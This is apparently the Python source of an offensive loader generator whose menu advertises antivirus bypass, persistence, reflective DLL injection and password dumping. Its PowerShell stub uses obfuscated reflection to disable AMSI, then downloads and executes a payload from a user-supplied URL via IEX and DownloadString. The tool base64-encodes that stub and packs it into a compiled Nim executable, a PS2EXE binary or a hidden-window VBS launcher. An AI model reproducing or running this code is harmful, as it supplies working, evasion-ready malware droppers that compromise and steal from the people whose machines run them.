from ast import If, While
import base64
from email.mime import base
from msilib.schema import Icon
from optparse import Option
from pdb import runcall
import sys, os, argparse, random, string
from time import sleep
from unittest import loader

graphical = """
####    ##    ##  #######  ########     ######   ########  ######## ######## ##    ## 
 ##     ###   ## ##     ##    ##       ##    ##  ##     ## ##       ##       ###   ## 
 ##     ####  ## ##     ##    ##       ##        ##     ## ##       ##       ####  ## 
 ##     ## ## ## ##     ##    ##       ##   #### ########  ######   ######   ## ## ## 
 ##     ##  #### ##     ##    ##       ##    ##  ##   ##   ##       ##       ##  #### 
 ##     ##   ### ##     ##    ##       ##    ##  ##    ##  ##       ##       ##   ### 
####    ##    ##  #######     ##        ######   ##     ## ######## ######## ##    ## 

 bilibli:我不是格林
 Github:https://github.com/INotGreen/Gllllnimloader
"""
Option_stub = """
.------..------..------..------.     .------..------..------..------..------..------..------.
|M.--. ||O.--. ||R.--. ||E.--. |.-.  |O.--. ||P.--. ||T.--. ||I.--. ||O.--. ||N.--. ||S.--. |
| (\/) || :/\: || :(): || (\/) ((5)) | :/\: || :/\: || :/\: || (\/) || :/\: || :(): || :/\: |
| :\/: || :\/: || ()() || :\/: |'-.-.| :\/: || (__) || (__) || :\/: || :\/: || ()() || :\/: |
| '--'M|| '--'O|| '--'R|| '--'E| ((1)) '--'O|| '--'P|| '--'T|| '--'I|| '--'O|| '--'N|| '--'S|
`------'`------'`------'`------'  '-'`------'`------'`------'`------'`------'`------'`------'

 1.免杀加载器(Bypass Loader)
 2.文件格式转换(File Format Conversion)
 3.权限维持(Backdoor Persistence)
 4.远程反射dll(Invoke-ReflectivePEInjection)
 5.免杀套接字(Bypass Socket)
 6.密码抓取工具(Passwords Dumping Tools)
 7.shellcode加密(ShellCode Encryption)
"""

stub = """
import winim/clr
import base64
var Automation = load("System.Management.Automation")
var RunspaceFactory = Automation.GetType("System.Management.Automation.Runspaces.RunspaceFactory")
var runspace = @RunspaceFactory.CreateRunspace()
runspace.Open()
var pipeline = runspace.CreatePipeline()
let strdecode = decode("REPLACED")
pipeline.Commands.AddScript(strdecode)
pipeline.Invoke()
runspace.Close()

"""
PowerShell_stub = """
Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("GREEN")
"""


powershell_to_vbs = """

<#Add-Type -AssemblyName System.Windows.Forms
<#$FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ 
    InitialDirectory = [Environment]::GetFolderPath('Desktop') 
    Filter = 'PS1 Scripts (*.ps1)|*.ps1'
}
$null = $FileBrowser.ShowDialog()

[System.Windows.MessageBox]::Show($FileBrowser.Filename)
$parent = Split-Path $FileBrowser.Filename -parent
[System.Windows.MessageBox]::Show($parent)
$child = $FileBrowser.SafeFileName#>

$text = [IO.File]::ReadAllText("stubps1tovbs.ps1")
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$encoded = [Convert]::ToBase64String($bytes)

New-Item  -Name "Green.vbs" -ItemType "file" -Value "Set objShell = CreateObject(""Wscript.Shell"")`nobjShell.Run(""powershell -sta -NoExit -WindowStyle Hidden -EncodedCommand """"$encoded""""""),vbhide"
"""

Loading_method = """
1.Automation的加载方式(无图标)
d8888          888                                    888    d8b                   
      d88888          888                                    888    Y8P                   
     d88P888          888                                    888                          
    d88P 888 888  888 888888  .d88b.  88888b.d88b.   8888b.  888888 888  .d88b.  88888b.  
   d88P  888 888  888 888    d88""88b 888 "888 "88b     "88b 888    888 d88""88b 888 "88b 
  d88P   888 888  888 888    888  888 888  888  888 .d888888 888    888 888  888 888  888 
 d8888888888 Y88b 888 Y88b.  Y88..88P 888  888  888 888  888 Y88b.  888 Y88..88P 888  888 
d88P     888  "Y88888  "Y888  "Y88P"  888  888  888 "Y888888  "Y888 888  "Y88P"  888  888 
               
2.PSTOEXE的加载方式(有图标)
8888888b.               88888888888           8888888888                            
888   Y88b                  888               888                                   
888    888                  888               888                                   
888   d88P .d8888b          888   .d88b.      8888888    888  888  .d88b.   .d8888b 
8888888P"  88K              888  d88""88b     888        `Y8bd8P' d8P  Y8b d88P"    
888        "Y8888b.         888  888  888     888          X88K   88888888 888      
888             X88         888  Y88..88P     888        .d8""8b. Y8b.     Y88b.    
888         88888P'         888   "Y88P"      8888888888 888  888  "Y8888   "Y8888P                                                                                                                                                                                                                                                   
"""

def main(powershell_to_vbs,PowerShell_stub, stub, verbose):
    print(graphical)
    url = input("请输入网址：")        
    PowerShell_stub = PowerShell_stub.replace("GREEN", url)
    #print(PowerShell_stub)
    PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
    stub = stub.replace("REPLACED", PowerShell_stubEncryption)
    #print(stub)
    print(Option_stub)
    Options = input("<INOTGREEN>:")
    if Options == "1":
          print("选择以下几种PowerShell的打包方式:\n")
          print(Loading_method)
          BypassAntivirus = input("请选择PowerShell的打包方式:")
          if verbose == True:
                if BypassAntivirus == "1":      
                      print("[+] 启用详细消息")
                      writefile = open("stub.nim", "w")
                      writefile.write(stub)
                      writefile.close()
                      sleep(1)
                      print("[+] 将新存根保存到 stub.nim")
                      sleep(1)
                      print("[+] 编译新存根...")             
                      os.system("nim c --hints:off --warnings:off -d:danger -d:strip --opt:size --passc=-flto --passl=-flto --app:gui .\stub.nim")                 
                      os.system("del stub.nim")
                if BypassAntivirus == "2":
                      Icon = input("请输入icon格式图标路径:")
                      print("[+] 启用详细消息")
                      writefile = open("stub.ps1", "w")
                      writefile.write(PowerShell_stub)
                      writefile.close()
                      sleep(1)
                      print("[+] 将新存根保存到 stub.ps1")
                      sleep(1)
                      print("[+] 编译新存根...")             
                      os.system("powershell .\PSTOEXE.ps1 -inputFile 'stub.ps1' -iconFile {} -outputFile 'stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(Icon))               
                      os.system("del stub.ps1")
                else:
                      return                                                                 
    if Options == "2":
          print("1.ps1_to_vbs\n2.exe_vbs\n3.exe")
          formatopions = input("<INOTGREEN>:")
          if formatopions == "1":
                  print("[+] 启用详细消息")
                  os.system("del Green.vbs")
                  writefile = open("stubps1tovbs.ps1", "w")
                  writefile.write(PowerShell_stub)
                  writefile.close()
                  Ps1ToVbs = open("Ps1ToVbs.ps1", "w")
                  Ps1ToVbs.write(powershell_to_vbs)
                  Ps1ToVbs.close()
                  sleep(1)
                  print("[+] 将新存根保存到 stubps1tovbs.ps1.ps1")
                  sleep(1)
                  os.system("powershell .\Ps1ToVbs.ps1")
                  os.system("del Ps1ToVbs.ps1")

         
main(powershell_to_vbs, PowerShell_stub, stub, verbose=True)


